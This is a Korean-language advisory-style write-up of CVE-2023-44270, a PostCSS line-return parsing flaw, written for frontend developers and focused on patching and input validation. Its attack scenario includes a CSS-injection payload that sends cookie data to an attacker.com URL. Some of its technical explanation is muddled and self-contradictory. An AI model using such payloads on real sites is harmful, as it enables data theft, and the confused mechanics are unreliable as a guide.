# CVE-2023-44270 - PostCSS Line Return Parsing Error

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2023-44270 |
| CVSS | 5.3 (Medium) |
| 영향 패키지 | postcss |
| 영향 버전 | < 8.4.31 |
| 수정 버전 | 8.4.31 |
| 공격 유형 | CSS Injection (파싱 결함) |
| 발견일 | 2023-09-29 |

## 왜 프론트엔드 개발자가 알아야 하는가

PostCSS는 거의 모든 모던 프론트엔드 프로젝트에서 사용된다:

1. **Tailwind CSS**: PostCSS 플러그인으로 동작
2. **Autoprefixer**: 벤더 프리픽스 자동 추가
3. **CSS Modules**: 스코프드 CSS 처리
4. **Next.js, Vite, webpack**: 빌드 체인에서 CSS 처리의 핵심
5. **CRA(Create React App)**: 내부적으로 PostCSS 사용

npm 주간 다운로드 1억+ 건. CVSS 5.3으로 점수는 Medium이지만, 사용 범위가 극도로 넓어 실질적 영향이 크다.

## 취약점 기술 분석

PostCSS가 CSS를 파싱할 때 `\r` (캐리지 리턴, CR) 문자를 줄바꿈으로 올바르게 처리하지 못한다. 이로 인해 인라인 CSS 주석(`//`) 내부에 `\r`을 삽입하면 주석이 조기 종료되어, 그 뒤의 코드가 실제 CSS로 해석된다.

```css
/* 정상적인 CSS */
// 이것은 주석이어야 함\r실제로 실행되는 CSS

/* PostCSS가 \r을 줄바꿈으로 처리하지 않으면:
   "// 이것은 주석이어야 함" → 주석으로 처리
   "\r실제로 실행되는 CSS" → 같은 줄로 인식하여 주석으로 처리되어야 하지만...
   실제로는 \r 이후가 새로운 줄로 해석되어 CSS로 실행됨
*/
```

핵심 원인:
- PostCSS의 토크나이저가 `\n`(LF)만 줄바꿈으로 인식
- `\r`(CR) 또는 `\r\n`(CRLF)을 정규화하지 않음
- 인라인 주석(`//`)의 범위 판단이 `\n`에만 의존
- 결과적으로 `\r` 뒤의 텍스트가 CSS 규칙으로 해석됨

## 공격 시나리오

```javascript
// 시나리오: 사용자가 CSS 변수를 커스텀할 수 있는 테마 기능

// 사용자 입력이 CSS로 주입되는 경우
const userThemeColor = 'blue';
// 공격자가 입력하는 값:
const maliciousInput = '// harmless comment\r} body { background: url(https://attacker.com/steal?cookie=' + 'document.cookie' + ') ';

// 서버에서 CSS를 생성하고 PostCSS로 처리
const css = `
:root {
  --user-color: ${maliciousInput};
}
`;

// PostCSS 처리 후, \r 이후의 코드가 유효한 CSS로 해석됨
// → 의도치 않은 CSS 규칙 삽입
// → 외부 URL로의 요청을 통한 데이터 유출 가능

// 또 다른 시나리오: CSS-in-JS에서
// styled-components나 emotion에서 사용자 입력을 테마로 사용할 때
const theme = {
  color: userInput // \r을 포함한 악성 입력
};
```

## 방어 방법

### 즉각 조치
```bash
npm ls postcss
npm install postcss@^8.4.31
npm audit fix
```

```json
{
  "overrides": {
    "postcss": ">=8.4.31"
  }
}
```

### 코드 레벨 방어
```javascript
// CSS에 사용자 입력을 삽입할 때 반드시 이스케이프
function sanitizeCSSValue(input) {
  // 제어 문자 제거
  return input
    .replace(/[\r\n\f\\]/g, '')
    .replace(/[{}();:@]/g, '');
}

// CSS Custom Properties에 사용자 값 삽입 시
const safeColor = sanitizeCSSValue(userInput);
element.style.setProperty('--user-color', safeColor);

// 서버 사이드에서 CSS 생성 시
function buildCSS(userValues) {
  // 허용된 값만 사용 (화이트리스트 접근)
  const allowedColors = ['red', 'blue', 'green', '#[0-9a-fA-F]{3,8}'];
  if (!allowedColors.some(pattern => new RegExp(`^${pattern}$`).test(userValues.color))) {
    throw new Error('Invalid color value');
  }
}
```

### 장기 전략
- 사용자 입력을 CSS에 직접 삽입하지 않기
- CSS Custom Properties는 `element.style.setProperty()`로 런타임에 설정
- CSP(Content Security Policy) 헤더로 인라인 스타일 제한
- CSS 생성 시 화이트리스트 기반 검증

## 교훈 & 프론트엔드 적용 포인트

1. **CSS도 인젝션 벡터**: SQL injection, XSS뿐 아니라 CSS injection도 실제 위협
2. **줄바꿈 문자의 차이**: `\n`, `\r`, `\r\n`의 차이가 보안 취약점으로 이어질 수 있음
3. **Medium 등급도 무시하지 마라**: CVSS가 낮아도 사용 범위가 넓으면 실질적 위험은 높음
4. **사용자 입력 → CSS**: 테마 커스터마이징 기능에서 항상 입력 검증 필요
5. **파서 간 불일치**: 브라우저 CSS 파서와 빌드 도구 파서의 해석 차이가 공격 벡터

## 참고 자료

- [NVD - CVE-2023-44270](https://nvd.nist.gov/vuln/detail/CVE-2023-44270)
- [GitHub Advisory GHSA-7fh5-64p2-3v2j](https://github.com/advisories/GHSA-7fh5-64p2-3v2j)
- [PostCSS Fix Commit](https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5)
- [PostCSS GitHub](https://github.com/postcss/postcss)
